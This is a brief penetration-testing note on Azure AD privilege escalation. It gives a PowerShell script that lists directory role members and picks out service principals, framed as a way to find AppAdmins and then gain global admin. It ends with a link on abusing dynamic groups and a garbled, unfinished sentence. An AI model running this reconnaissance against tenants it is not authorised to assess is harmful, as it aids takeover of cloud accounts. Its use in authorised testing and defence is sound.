# Privilege Escalation
## Privilege Escalation via Service Principals

Learn every detail in that URL:  
[Privilege Escalation via Service Principals](https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5)

The script below gives you ability to find AppAdmins and by getting AppAdmins you have posibility to take global admin privileges. (Coppied from that page)

```
# Install the AzureAD PowerShell module
Install-Module AzureAD
# Authenticate to the tenant
$username = "username@domain.com"
$password = 'YourVeryStrongPassword'
$SecurePassword = ConvertTo-SecureString “$password” -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($username, $SecurePassword)
Connect-AzureAD -Credential $Credential
# Build our users and roles object
$UserRoles = Get-AzureADDirectoryRole | ForEach-Object {
        
    $Role = $_
    $RoleDisplayName = $_.DisplayName
        
    $RoleMembers = Get-AzureADDirectoryRoleMember -ObjectID $Role.ObjectID
        
    ForEach ($Member in $RoleMembers) {
    $RoleMembership = [PSCustomObject]@{
            MemberName      = $Member.DisplayName
            MemberID        = $Member.ObjectID
            MemberOnPremID  = $Member.OnPremisesSecurityIdentifier
            MemberUPN       = $Member.UserPrincipalName
            MemberType      = $Member.ObjectType
            RoleID          = $Role.RoleTemplateId
            RoleDisplayName = $RoleDisplayName
     }
        
        $RoleMembership
        
    }    
}
$UserRoles | ?{$_.MemberType -eq "ServicePrincipal"}
```


## Abusing Dynamic groups in Azure AD


If you have dynamic groups Implementation, than it would be good to examine all groups constructor scripts. So with that examination you will ba able fjn
https://www.mnemonic.io/resources/blog/abusing-dynamic-groups-in-azure-ad-for-privilege-escalation/